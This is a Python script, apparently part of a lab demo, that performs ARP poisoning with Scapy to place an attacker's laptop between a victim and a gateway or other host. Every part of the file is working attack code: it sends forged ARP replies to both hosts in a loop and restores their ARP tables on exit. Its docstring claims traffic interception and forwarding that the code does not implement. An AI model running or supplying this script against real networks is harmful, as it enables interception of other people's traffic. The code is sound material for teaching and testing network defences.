#!/usr/bin/env python3
"""
STEP 2: ARP Poisoning Attack

Run this on Laptop C (Attacker) to intercept traffic between Laptops A and B.

Usage:
    sudo python scripts/2_attacker.py -i <interface> -v <victim_ip> -g <gateway_or_other_ip>
    
Example:
    sudo python scripts/2_attacker.py -i en0 -v 192.168.1.10 -g 192.168.1.20

This script:
1. Sends fake ARP replies to the victim saying "I am the gateway"
2. Sends fake ARP replies to the gateway saying "I am the victim"
3. Intercepts and forwards traffic between them (MITM)
"""

import sys
import argparse
import time
import signal
from datetime import datetime

sys.path.insert(0, '.')

try:
    from scapy.all import (
        Ether, ARP, sendp, send, srp, getmacbyip,
        get_if_hwaddr, sniff, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    print("ERROR: Scapy not installed. Run: pip install scapy")
    sys.exit(1)

from core.network_utils import get_interface_info, get_mac_address


class ARPAttacker:
    """ARP Poisoning Attack for demo."""
    
    def __init__(self, interface: str, victim_ip: str, target_ip: str):
        self.interface = interface
        self.victim_ip = victim_ip
        self.target_ip = target_ip
        self.running = False
        self.packets_sent = 0
        self.packets_intercepted = 0
        
        # Get our info
        info = get_interface_info(interface)
        if not info:
            raise ValueError(f"Cannot get info for interface {interface}")
        self.our_mac = info.mac
        self.our_ip = info.ip
        
        # Get victim's real MAC
        self.victim_mac = get_mac_address(victim_ip, interface)
        if not self.victim_mac:
            raise ValueError(f"Cannot resolve MAC for victim {victim_ip}")
            
        # Get target's real MAC
        self.target_mac = get_mac_address(target_ip, interface)
        if not self.target_mac:
            raise ValueError(f"Cannot resolve MAC for target {target_ip}")
            
        print(f"\n{'='*60}")
        print(f"  ARP POISONING ATTACK")
        print(f"{'='*60}")
        print(f"  Interface:    {interface}")
        print(f"  Attacker IP:  {self.our_ip}")
        print(f"  Attacker MAC: {self.our_mac}")
        print(f"  ")
        print(f"  Victim IP:    {victim_ip}")
        print(f"  Victim MAC:   {self.victim_mac}")
        print(f"  ")
        print(f"  Target IP:    {target_ip}")
        print(f"  Target MAC:   {self.target_mac}")
        print(f"{'='*60}")
        print(f"\n  ⚠️  WARNING: Only use on networks you own!")
        print(f"{'='*60}\n")
        
    def poison(self):
        """Send poisoned ARP packets to both victim and target."""
        # Tell victim: "I am target" (send our MAC for target's IP)
        victim_packet = Ether(dst=self.victim_mac, src=self.our_mac) / ARP(
            op=2,  # ARP Reply
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.target_ip,  # Claim to be target
            hwsrc=self.our_mac    # But use our MAC
        )
        
        # Tell target: "I am victim" (send our MAC for victim's IP)
        target_packet = Ether(dst=self.target_mac, src=self.our_mac) / ARP(
            op=2,  # ARP Reply
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.victim_ip,  # Claim to be victim
            hwsrc=self.our_mac    # But use our MAC
        )
        
        sendp(victim_packet, iface=self.interface, verbose=False)
        sendp(target_packet, iface=self.interface, verbose=False)
        self.packets_sent += 2
        
    def restore(self):
        """Restore original ARP entries."""
        print("\n[*] Restoring ARP tables...")
        
        # Tell victim the real target MAC
        restore_victim = Ether(dst=self.victim_mac, src=self.target_mac) / ARP(
            op=2,
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac
        )
        
        # Tell target the real victim MAC
        restore_target = Ether(dst=self.target_mac, src=self.victim_mac) / ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.victim_ip,
            hwsrc=self.victim_mac
        )
        
        for _ in range(5):
            sendp(restore_victim, iface=self.interface, verbose=False)
            sendp(restore_target, iface=self.interface, verbose=False)
            time.sleep(0.5)
            
        print("[✓] ARP tables restored")
        
    def start(self, interval: float = 2.0):
        """Start the attack."""
        self.running = True
        print("[*] Starting ARP poisoning attack...")
        print(f"[*] Sending poison packets every {interval} seconds")
        print("[*] Press Ctrl+C to stop and restore ARP tables\n")
        
        try:
            while self.running:
                self.poison()
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(f"[{timestamp}] Poison packets sent (Total: {self.packets_sent})")
                time.sleep(interval)
        except KeyboardInterrupt:
            self.running = False
            
        self.restore()
        print(f"\n[*] Attack complete. Total packets sent: {self.packets_sent}")


def main():
    parser = argparse.ArgumentParser(description="ARP Poisoning Attack")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
    parser.add_argument("-g", "--target", required=True, help="Target IP (gateway or other host)")
    parser.add_argument("--interval", type=float, default=2.0, help="Poison interval (seconds)")
    args = parser.parse_args()
    
    attacker = ARPAttacker(args.interface, args.victim, args.target)
    attacker.start(args.interval)


if __name__ == "__main__":
    main()
